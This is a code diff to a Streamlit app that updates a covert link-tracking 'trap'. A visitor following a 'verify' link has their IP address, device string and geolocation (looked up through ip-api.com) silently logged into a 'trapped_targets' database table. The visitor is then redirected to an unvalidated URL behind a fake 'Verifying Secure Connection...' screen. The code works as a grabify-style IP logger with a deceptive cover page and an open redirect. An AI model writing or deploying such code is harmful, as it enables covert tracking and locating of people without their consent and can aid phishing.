@@ -36,39 +36,34 @@ except Exception as e:
     st.error("CRITICAL: Supabase Secrets missing. Check your Dashboard!")
     st.stop()
 
-# --- 3. THE SILENT LINK TRAP LOGIC (v6.0 GEO-UPGRADE) ---
+# --- 3. THE GHOST REDIRECTOR ---
 query_params = st.query_params
-if "trap" in query_params:
+if "verify" in query_params:
     target_redir = query_params.get("redir", "https://google.com")
     ip = st.context.headers.get("X-Forwarded-For", "Unknown IP").split(',')[0]
     
-    # SILENT GEO-LOOKUP
     try:
         geo = requests.get(f"http://ip-api.com/json/{ip}", timeout=2).json()
         lat, lon, city = geo.get("lat", 0), geo.get("lon", 0), geo.get("city", "Unknown")
-    except:
-        lat, lon, city = 0, 0, "Unknown"
-
-    log_entry = {
-        "ip_address": ip,
-        "user_agent": st.context.headers.get("User-Agent", "Unknown Device"),
-        "destination_url": target_redir,
-        "lat": lat,
-        "lon": lon,
-        "city": city
-    }
-    try:
+        log_entry = {
+            "ip_address": ip,
+            "user_agent": st.context.headers.get("User-Agent", "Unknown"),
+            "destination_url": target_redir,
+            "lat": lat, "lon": lon, "city": city
+        }
         supabase.table("trapped_targets").insert(log_entry).execute()
-    except:
-        pass 
+    except: pass
     
-    st.markdown(f'<meta http-equiv="refresh" content="0;URL=\'{target_redir}\'">', unsafe_allow_html=True)
-    st.stop()
+    st.markdown(f"""
+        <html>
+        <head><meta http-equiv="refresh" content="0;URL='{target_redir}'"></head>
+        <body style="background-color:black; color:#00FF41; font-family:monospace; display:flex; justify-content:center; align-items:center; height:100vh;">
+            <p>Verifying Secure Connection...</p>
+        </body>
+        </html>
+    """, unsafe_allow_html=True)
+    st.stop() 
 
-    # Instant Redirect via JavaScript Meta-Refresh
-    st.markdown(f'<meta http-equiv="refresh" content="0;URL=\'{target_redir}\'">', unsafe_allow_html=True)
-    st.write("Loading secure content...")
-    st.stop()
 
 # --- 4. THE GATEKEEPER & AUTH SYSTEM (EMAIL ONLY) ---
 if "access_granted" not in st.session_state:
